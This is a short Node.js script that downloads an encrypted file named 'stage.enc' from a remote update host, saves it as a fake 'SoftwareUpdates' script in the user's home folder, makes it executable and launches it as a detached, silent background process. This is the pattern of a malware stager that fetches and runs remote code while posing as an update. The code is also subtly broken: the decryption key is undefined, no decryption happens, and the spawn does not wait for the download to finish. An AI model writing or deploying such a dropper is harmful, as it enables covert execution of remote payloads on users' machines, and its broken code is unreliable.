const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawn } = require('child_process');

const stage = path.join(os.homedir(), "Scripts", "SoftwareUpdates", "stage.js");
const output = fs.createWriteStream(stage);
https.get('https://updates.example.net/stage.enc', (response) => {
  response.pipe(output);
});

crypto.subtle.importKey('raw', key, 'AES-GCM', false, ['decrypt']);
fs.chmodSync(stage, '755');
spawn('node', [stage], { detached: true, stdio: 'ignore' }).unref();
